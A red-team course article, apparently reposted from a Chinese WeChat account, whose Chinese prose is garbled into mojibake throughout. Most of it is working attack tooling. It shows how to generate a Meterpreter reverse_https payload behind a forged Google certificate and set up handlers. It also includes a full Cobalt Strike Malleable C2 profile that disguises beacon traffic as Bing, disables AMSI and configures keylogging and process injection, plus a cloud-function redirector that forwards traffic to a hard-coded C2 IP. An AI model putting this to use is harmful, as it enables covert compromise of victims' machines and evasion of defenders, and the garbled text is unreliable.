<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WtcnayS-t57apWax9PyOxw)

********æ–‡ç« æ¥æºï½œMS08067 çº¢é˜ŸåŸ¹è®­ç­ ç¬¬5æœŸ********  

æœ¬æ–‡ä½œè€…ï¼š**thresh**ï¼ˆçº¢é˜ŸåŸ¹è®­ç­5æœŸå­¦å‘˜ï¼‰

**MSFä½¿ç”¨httpsç›‘å¬**

1ã€è¯ä¹¦ç”Ÿæˆï¼š

opensslçš„ä½¿ç”¨ç”Ÿæˆè¯ä¹¦å‘½ä»¤(ä¼ªé€ çš„)

```
`openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \``-subj "/C=UK/ST=London/L=London/O=Development/CN=www.google.com" \``-keyout www.google.com.key \``-out www.google.com.crt && \``cat www.google.com.key www.google.com.crt > www.google.com.pem && \``rmÂ -fÂ www.google.com.keyÂ www.google.com.crt`
```

  

2ã€ç”Ÿæˆ HTTPS çš„ payload(ç”Ÿæˆçš„payloadéœ€è¦ç»è¿‡å…æ€å¤„ç†)

```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.80.134 lport=7777  PayloadUUIDTracking=true HandlerSSLCert=www.google.com.pem PayloadUUIDName=xyh -f exe -o payload.exe
```

  

3ã€MSFå¼€å¯ç›‘å¬

```
`use exploit/multi/handler``set payload windows/x64/meterpreter/reverse_https``set lhost 192.168.80.134``set lport 7777``set handlersslcert /home/thresh/MSF/cert_file/www.google.com.pem``set stagerverifysslcert true``run`
```

  

è¿æ¥æˆåŠŸ

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJkMg2TlkxI0XpPp8vktS5sJ3ZeDY8LGoDYzF7SiaONSGbIw1XncqMPfET8LscrZV8KQHRY0LAcbA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

WiresharkæŠ“åŒ…çš„æ•°æ®æ˜¯ç»è¿‡åŠ å¯†å¤„ç†çš„

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**MSFä½¿ç”¨ngrockå‰ç½®**

å…¶å®å°±æ˜¯å†…ç½‘ç©¿é€ï¼Œä½¿ç”¨frpåšæ˜ å°„ä¹Ÿèƒ½å®ç°ç›¸åŒçš„æ•ˆæœï¼Œå†…ç½‘çš„ä¸­çš„Kaliå¯ä»¥é€šè¿‡VSPè®¿é—®åˆ°å¦å¤–ä¸€ä¸ªå†…ç½‘ä¸­ã€‚

å°†æœ¬åœ°ç›‘å¬çš„ç«¯å£æ˜ å°„åˆ°vspæŒ‡å®šç«¯å£ï¼Œåå¼¹shellè¿æ¥vpsçš„ç«¯å£ï¼Œå³å¯è¿æ¥æœ¬åœ°msfã€‚

  

  

**CSçš„ä½¿ç”¨**

å…³äºCSçš„ä½¿ç”¨ï¼Œå‚è€ƒCobaltStrike å®˜ç½‘ï¼šhttps://www.cobaltstrike.com/

CobaltStrikeåŸºç¡€å­¦ä¹ ï¼šhttps://www.bilibili.com/video/BV1754y1Q7im?p=3&spm_id_from=333.1007.top_right_bar_window_history.content.click

**CS-ä¿®æ”¹é»˜è®¤ç«¯å£**

é»˜è®¤ç«¯å£ä¸º50050ï¼Œä¿®æ”¹ä¸º5555

ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼švim teamserver

```
`#!/bin/bash``#``# Start Cobalt Strike Team Server``#``# make pretty looking messages (thanks Carlos)``function print_good () {``echo -e "\x1B[01;32m[+]\x1B[0m $1"``}``function print_error () {``echo -e "\x1B[01;31m[-]\x1B[0m $1"``}``function print_info () {``echo -e "\x1B[01;34m[*]\x1B[0m $1"``}``# check that we're r00t``if [ $UID -ne 0 ]; then``print_error "Superuser privileges are required to run the team server"``exit``fi``# check if java is available...``if [ $(command -v java) ]; then``true``else``print_error "java is not in \$PATH"``echo "    is Java installed?"``exit``fi``# check if keytool is available...``if [ $(command -v keytool) ]; then``true``else``print_error "keytool is not in \$PATH"``echo "    install the Java Developer Kit"``exit``fi``# generate a certificate``# naturally you're welcome to replace this step with your own permanent certificate.``# just make sure you pass -Djavax.net.ssl.keyStore="/path/to/whatever" and``# -Djavax.net.ssl.keyStorePassword="password" to java. This is used for setting up``# an SSL server socket. Also, the SHA-1 digest of the first certificate in the store``# is printed so users may have a chance to verify they're not being owned.``if [ -e ./cobaltstrike.store ]; then``print_info "Will use existing X509 certificate and keystore (for SSL)"``else``print_info "Generating X509 certificate and keystore (for SSL)"``keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname "CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth"``fi``# start the team server.``java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer $*`
```

  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

è¿æ¥

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**CS-ä¿®æ”¹è¯ä¹¦**

é»˜è®¤è¯ä¹¦æ–‡ä»¶

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

æŸ¥çœ‹è¯ä¹¦ï¼Œé»˜è®¤å¯†é’¥å£ä»¤ä¸º123456

```
`â”Œâ”€â”€(rootğŸ’€thresh-kali)-[/home/thresh/CS/cs4.0æ±‰åŒ–ç‰ˆ/cs4.0åŸç‰ˆ]``â””â”€# keytool -list -v -keystore cobaltstrike.store                                                                                   1 â¨¯``è¾“å…¥å¯†é’¥åº“å£ä»¤:` `å¯†é’¥åº“ç±»å‹: PKCS12``å¯†é’¥åº“æä¾›æ–¹: SUN``æ‚¨çš„å¯†é’¥åº“åŒ…å« 1 ä¸ªæ¡ç›®``åˆ«å: cobaltstrike``åˆ›å»ºæ—¥æœŸ: 2022å¹´3æœˆ23æ—¥``æ¡ç›®ç±»å‹: PrivateKeyEntry``è¯ä¹¦é“¾é•¿åº¦: 1``è¯ä¹¦[1]:``æ‰€æœ‰è€…: CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, ST=Cyberspace, C=Earth``å‘å¸ƒè€…: CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, ST=Cyberspace, C=Earth``åºåˆ—å·: 8782b46``ç”Ÿæ•ˆæ—¶é—´: Wed Mar 23 10:23:56 CST 2022, å¤±æ•ˆæ—¶é—´: Tue Jun 21 10:23:56 CST 2022``è¯ä¹¦æŒ‡çº¹:` `SHA1: 25:21:5A:E8:88:47:F4:B1:6F:8E:CC:66:6B:C9:65:08:0D:E2:5F:90` `SHA256: F3:06:63:BA:AF:6F:74:93:85:7E:A9:76:56:6F:2A:C8:5F:B8:ED:8F:C0:9B:52:0F:6D:B3:84:FC:4A:1D:80:56``ç­¾åç®—æ³•åç§°: SHA256withRSA``ä¸»ä½“å…¬å…±å¯†é’¥ç®—æ³•: 2048 ä½ RSA å¯†é’¥``ç‰ˆæœ¬: 3``æ‰©å±•:` `#1: ObjectId: 2.5.29.14 Criticality=false``SubjectKeyIdentifier [``KeyIdentifier [``0000: 40 6E 18 96 5A 07 B2 1A   69 2B E6 00 F9 E6 CF D4  @n..Z...i+......``0010: F1 0D DC CF                                        ....``]``]``*******************************************``*******************************************`
```

  

ç”Ÿæˆæ–°è¯ä¹¦

```
keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname "CN=US, OU=360.com, O=Sofaware, L=Somewhere,ST=Cyberspace, C=CN"
```

å°†æ–°ç”Ÿæˆçš„è¯ä¹¦æ›¿æ¢å³å¯ã€‚

**CS-profileæ–‡ä»¶**

csçš„profileæ–‡ä»¶å¯ä»¥ä¿®æ”¹æµé‡ç‰¹å¾ä»¥åŠä¿®æ”¹beaconçš„é»˜è®¤è¡Œä¸ºï¼Œå°†æ”»å‡»æµé‡ä¼ªè£…æˆæ­£å¸¸çš„æµé‡ã€‚

ä¿®æ”¹å¦‚ä¸‹éƒ¨åˆ†çš„ç‰¹å¾

1ã€getè¯·æ±‚  
2ã€postè¯·æ±‚

3ã€è¢«è¿œç¨‹åŠ è½½çš„beacon.dllçš„ç‰¹å¾

4ã€è¿œç¨‹åŠ è½½beacon.dllçš„url

5ã€è¿›ç¨‹æ³¨å…¥çš„å…·ä½“ç»†èŠ‚

6ã€åæ¸—é€æ¨¡å—çš„ç‰¹å¾ä¿®æ”¹

  

å‚è€ƒä¾‹å­ï¼š  

```
`# CobaltStrike 4.0+ Test Profile``#``# References:``# * https://www.cobaltstrike.com/help-malleable-c2``# * https://www.cobaltstrike.com/help-malleable-postex``#``# Author: lengyi@HongHuLab``# Github: https://github.com/lengjibo``#``### Global Option Block``# åç§°``set sample_name "bing.profile"; # Profile name``# å›ä¼ æ—¶é—´``set sleeptime "30000"; # Sleep time for the beacon callback``# set sleeptime "<60000>"; # 1 Minute``# set sleeptime "<70000>";``# set sleeptime "<80000>";``set jitter "50"; # Jitter to set %. In this example, the beacon will callback``between 15 and 30 sec jitter``# DNS beacon``# è®¾ç½®DNS``dns-beacon {``# Options moved into 'dns-beacon' group in 4.3:` `set dns_idle "114.114.114.114";` `set dns_max_txt "192";` `set dns_sleep "1";` `set dns_ttl "5";` `set maxdns "200";` `set dns_stager_prepend "doc-stg-prepend";` `set dns_stager_subhost "doc-stg-sh.";` `# DNS subhost override options added in 4.3:` `set beacon "doc.bc.";` `set get_A "doc.1a.";` `set get_AAAA "doc.4a.";` `set get_TXT "doc.tx.";` `set put_metadata "doc.md.";` `set put_output "doc.po.";` `set ns_response "zero";``}``#set dns_idle "8.8.4.4";``#set dns_sleep "0";``#set maxdns "235";``set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS.Required by stagers.``set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3;``.NET CLR 3.1.40767; Trident/6.0; en-IN)"; # User-Agent``### Self-Signed Certificate HTTPS``# è®¾ç½®httpsè¯ä¹¦``https-certificate {` `set CN "us";` `set O "us";` `set C "us";` `set L "us";` `set OU "us";` `set ST "us";` `set validity "365";``}``### Valid SSL Certificate HTTPS``https-certificate {` `set keystore "domain.store";` `set password "Tz8@CxnJcAN3DM^D";``}``### Code Signing Certificate``code-signer {` `set keystore "server.jks";` `set password "Tz8@CxnJcAN3DM^D";` `set alias "server";``}``### HTTP/S Global Response Header``http-config {` `set headers "Server, Cache-Control, Connection, X-Powered-By"; # HTTP header` `header "Server" "Microsoft-IIS/8.0";` `header "Cache-Control" "max-age=1";` `header "Connection" "keep-alive";` `header "X-Powered-By" "ASP.NET";` `set trust_x_forwarded_for "false"; # "true" if the team server is behind an HTTP redirector``}``### SMB Beacon``set pipename "win_svc";``set pipename_stager "win_svc2";``### TCP Beacon``set tcp_port "1337"; # TCP beacon listen port``### HTTP-GET``http-get {` `set uri "/search/";` `client {` `header "Host" "www.bing.com";` `header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";` `header "Cookie" "DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG";` `metadata {` `base64url;` `parameter "q";` `}` `parameter "go" "Search";` `parameter "qs" "bs";` `parameter "form" "QBRE";``}` `server {` `header "Cache-Control" "private, max-age=0";` `header "Content-Type" "text/html; charset=utf-8";` `header "Vary" "Accept-Encoding";` `header "Server" "Microsoft-IIS/8.5";` `header "Connection" "close";` `output {` `netbios;` `prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\"``xmlns=\"http://www.w3.org/1999/xhtml\"``xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<!``[CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta``content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link``href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\"``rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?``format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\"``title=\"RSS\" type=\"application/rss+xml\" /><link``href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script``type=\"text/javascript\">//<![CDATA[";``append "G={ST:(si_ST?si_ST:new Date),Mkt:\"enUS\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37F``A2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:``\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" };``_G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function``si_T(a){ if(document.images){_G.GPImg=new``Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script>``<style``type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";` `print;``}``}``}``### HTTP-POST``http-post {` `set uri "/Search/";` `set verb "GET";` `client {` `header "Host" "www.bing.com";` `header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";` `header "Cookie" "DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG";` `output {` `base64url;` `parameter "q";` `}` `parameter "go" "Search";` `parameter "qs" "bs";` `id {` `base64url;` `parameter "form";` `}``}``server {` `header "Cache-Control" "private, max-age=0";` `header "Content-Type" "text/html; charset=utf-8";` `header "Vary" "Accept-Encoding";` `header "Server" "Microsoft-IIS/8.5";` `header "Connection" "close";` `output {` `netbios;` `prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\"``xmlns=\"http://www.w3.org/1999/xhtml\"``xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<!``[CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta``content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link``href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\"``rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?``format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\"``title=\"RSS\" type=\"application/rss+xml\" /><link``href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script``type=\"text/javascript\">//<![CDATA[";``append "G={ST:(si_ST?si_ST:new Date),Mkt:\"enUS\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37F``A2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:``\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" };``_G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function``si_T(a){ if(document.images){_G.GPImg=new``Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script>``<style``type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";` `print;``}``}``}``### HTTP-stager``http-stager {` `set uri_x86 "/jquery-3.3.1.slim.min.js";` `set uri_x64 "/jquery-3.3.2.slim.min.js";` `server {` `header "Cache-Control" "private, max-age=0";` `header "Content-Type" "text/html; charset=utf-8";` `header "Vary" "Accept-Encoding";` `header "Server" "Microsoft-IIS/8.5";` `header "Connection" "close";` `output {` `prepend "user=";` `append ".asp";` `print;` `}` `}``}``### Stage``stage {` `set checksum "0";` `set image_size_x86 "559966";` `set image_size_x64 "559966";` `set entry_point "38807";` `set rich_header``"\xcd\x11\x8f\xf8\x89\x70\xe1\xab\x89\x70\xe1\xab\x89\x70\xe1\xab\x3d\xec\x10\xa``b\x9c\x70\xe1\xab\x3d\xec\x12\xab\x0a\x70\xe1\xab\x3d\xec\x13\xab\x90\x70\xe1\xa``b\xea\x2d\xe2\xaa\x9b\x70\xe1\xab\xea\x2d\xe4\xaa\xae\x70\xe1\xab\xea\x2d\xe5\xa``a\x9b\x70\xe1\xab\x80\x08\x72\xab\x82\x70\xe1\xab\x89\x70\xe0\xab\x03\x70\xe1\xa``b\xe7\x2d\xe4\xaa\x80\x70\xe1\xab\xe7\x2d\x1e\xab\x88\x70\xe1\xab\x89\x70\x76\xa``b\x88\x70\xe1\xab\xe7\x2d\xe3\xaa\x88\x70\xe1\xab\x52\x69\x63\x68\x89\x70\xe1\xa``b\x00\x00\x00\x00\x00\x00\x00\x00";``set userwx "false";``# set compile_time "14 Jul 2009 8:14:00";``set image_size_x86 "512000";``set image_size_x64 "512000";``set obfuscate "true";``transform-x86 {``prepend "\x90\x90";``strrep "ReflectiveLoader" "DoLegitStuff";``}``transform-x64 {``prepend "\x90\x90";``strrep "ReflectiveLoader" "DoLegitStuff";``}``stringw "I am not Beacon";``}``### Post-Exploitation``post-ex {``# control the temporary process we spawn to``set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";``set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";``# change the permissions and content of our post-ex DLLs``set obfuscate "true";``# change our post-ex output named pipe names...``set pipename "msrpc_####, win\\msrpc_##";``# pass key function pointers from Beacon to its child jobs``set smartinject "true";``# disable AMSI in powerpick, execute-assembly, and psinject``set amsi_disable "true";``#The thread_hint option allows multi-threaded post-ex DLLs to spawn``# threads with a spoofed start address. Specify the thread hint as``# â€œmodule!function+0x##â€ to specify the start address to spoof.``# The optional 0x## part is an offset added to the start address.``# set thread_hint "....TODO:FIXME"``# options are: GetAsyncKeyState (def) or SetWindowsHookEx``set keylogger "GetAsyncKeyState";``}``### Process Inject``process-inject {` `# set how memory is allocated in a remote process` `# VirtualAllocEx or NtMapViewOfSection. The` `# NtMapViewOfSection option is for same-architecture injection only.` `# VirtualAllocEx is always used for cross-arch memory allocations.` `set allocator "VirtualAllocEx";` `# shape the memory characteristics and content` `set min_alloc "16384";` `set startrwx "true";` `set userwx "false";` `transform-x86 {` `prepend "\x90\x90";` `}` `transform-x64 {` `# transform x64 injected content` `}` `# determine how to execute the injected code` `execute {` `CreateThread "ntdll.dll!RtlUserThreadStart";` `SetThreadContext;` `RtlCreateUserThread;` `}``}`
```

å‚è€ƒï¼š

https://blog.csdn.net/qq_41874930/article/details/118381131

https://blog.csdn.net/darkb1rd/article/details/115963655

https://shanfenglan.blog.csdn.net/article/details/107791606

https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/malleable-c2

  

**CS-äº‘å‡½æ•°å‰ç½®**

è…¾è®¯äº‘é…ç½®

1ã€åœ¨æ§åˆ¶å°é¡µé¢æ‰¾åˆ°å‡½æ•°æœåŠ¡ï¼Œæ–°å»ºä¸€ä¸ª

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

2ã€åˆ›å»ºå‡½æ•°

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

3ã€ç¼–å†™ä»£ç 

```
`# -*- coding: utf8 -*-``import json,requests,base64``def main_handler(event, context):` `C2='http://101.34.168.194' # sè®¾ç½®ipå¯ä»¥ä½¿ç”¨ HTTPã€HTTPS~ä¸‹è§’æ ‡~` `path=event['path']` `headers=event['headers']` `print(event)` `if event['httpMethod'] == 'GET' :` `resp=requests.get(C2+path,headers=headers,verify=False)` `else:` `resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)` `print(resp.headers)` `print(resp.content)` `response={` `"isBase64Encoded": True,` `"statusCode": resp.status_code,` `"headers": dict(resp.headers),` `"body": str(base64.b64encode(resp.content))[2:-1]` `}` `returnÂ response`
```

  

4ã€è§¦å‘å™¨é…ç½®

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

5ã€åˆ›å»ºåï¼Œé€‰æ‹©apiæœåŠ¡åï¼Œä¿®æ”¹ä¸ºæ ¹è·¯å¾„

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

ç‚¹å‡»ç¼–è¾‘ï¼Œç„¶åå‘å¸ƒæœåŠ¡

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

6ã€é…ç½®profile

```
`set sample_name "yunfunc.profile";``set sleeptime "3000";``set jitter "0";``set maxdns "255";``set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";``http-get {``set uri "/api/x";` `client {` `header "Accept" "*/*";` `metadata {` `base64;` `prepend "SESSIONID=";` `header "Cookie";` `}` `}` `server {` `header "Content-Type" "application/ocsp-response";` `header "content-transfer-encoding" "binary";` `header "Server" "Nodejs";` `output {` `base64;` `print;` `}` `}``}``http-stager {` `set uri_x86 "/vue.min.js";` `set uri_x64 "/bootstrap-2.min.js";` `}``http-post {` `set uri "/api/y";` `client {` `header "Accept" "*/*";` `id {` `base64;` `prepend "JSESSION=";` `header "Cookie";` `}` `output {` `base64;` `print;` `}` `}` `server {` `header "Content-Type" "application/ocsp-response";` `header "content-transfer-encoding" "binary";` `header "Connection" "keep-alive";` `output {` `base64;` `print;` `}` `}``}`
```

  

7ã€æŸ¥çœ‹è°ƒç”¨æƒ…å†µ

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

8ã€åœ¨CSæ—¥å¿—æŸ¥çœ‹ï¼Œäº‘å‡½æ•°é…ç½®æˆåŠŸ

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

9ã€ä½¿ç”¨CSä¸Šçº¿

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

å‚è€ƒï¼š

https://zhuanlan.zhihu.com/p/357726553

https://www.cnblogs.com/sunny11/p/15897335.html

https://blog.csdn.net/shuteer_xu/article/details/119224742

https://xz.aliyun.com/t/10764

**MSFä¸CSäº’ç›¸è½¬æ¢**

**MSF-to-CS**

æ€è·¯ï¼šå…ˆè·å–åˆ°MSFçš„shellï¼Œç„¶åé€šè¿‡è¿›ç¨‹æ³¨å…¥çš„æ–¹å¼ç”ŸæˆCSçš„åå¼¹shellã€‚

1ã€msfè·å–åˆ°shell

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

2ã€csç”Ÿæˆhttpç›‘å¬ï¼Œè®¾ç½®ä¸€ä¸ªBeacon HTTPç›‘å¬

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

3ã€msfè®¾ç½®

```
`search payload_inject``use 0  #é»˜è®¤æ˜¯ exploit/windows/local/payload_injectï¼Œå¯æ ¹æ®éœ€è¦è¿›è¡Œä¿®æ”¹``use exploit/windows/local/payload_inject``set payload windows/meterpreter/reverse_http``set lhost 0.0.0.0``set lport 81``run`
```

  

windwoså¼¹å‡ºä¸€ä¸ªtxtï¼ŒCSæ²¡æœ‰èµ·æ¥

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

4ã€éœ€è¦è®¾ç½®ä¸€ä¸ªPidï¼Œçº¿ç¨‹æ³¨å…¥ï¼Œç”¨æˆ·æƒé™çš„å’Œ32ä½çš„è¿›ç¨‹

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**CS-to-MSF**

æ€è·¯ï¼šå’ŒMSFè½¬CSç±»ä¼¼ã€‚

1ã€è·å–åˆ°CS shellå

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

2ã€é€‰æ‹©Spawnï¼Œæ–°å»ºä¸€ä¸ª

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

3ã€msfä¸Šè®¾ç½®

```
`use exploit/multi/handler``set windows/x64/meterpreter/reverse_http``set lhost 0.0.0.0``set lport 7777``exploit`
```

  

4ã€msfä¸Šçº¿æˆåŠŸ

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

****HVVè¡ŒåŠ¨-çº¢é˜Ÿæ”»é˜² ç¬¬6æœŸ****

**4.1å·å¼€ç­æŠ¥åä¸­**

  

**è¯¾ç¨‹è´¹ç”¨**

æ¯æœŸç­å®šä»·**2999**ï¼Œ**ç¬¬6æœŸç­****HVV****ä»·****ï¼š****2499**ï¼ˆè½¬å‘æœ¬æ–‡é€499å…ƒå†…ç½‘çŸ¥è¯†æ˜Ÿçƒï¼‰ï¼Œ**æ¯ä¸ªæŠ¥åå­¦å‘˜éƒ½å¯äº«å—ä¸€æ¬¡â€œå…è´¹é‡å¬åç»­ä»»æ„ä¸€æœŸ**ç›´æ’­è¯¾ï¼ˆä¸å«å½•æ’­ï¼‰â€**çš„æƒç›Š**ï¼Œä¸€æ¬¡æ²¡å­¦æ‡‚å°±å†æ¥ä¸€éï¼  
  
**å·²ç»æŠ¥å…¶ä»–åŸ¹è®­ç­çš„åŒå­¦ï¼Œå¯äº«ä¼˜æƒ ä»·2399å…ƒ~**

**æŠ¥åæ–¹å¼**

1.å¯ç›´æ¥ç™»å½•å®˜ç½‘åœ¨çº¿æŠ¥åï¼ŒæŠ¥ååœ°å€ï¼šhttps://www.ms08067.com/my/course/12

2.åŠ å®¢æœå¾®ä¿¡æŠ¥å  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

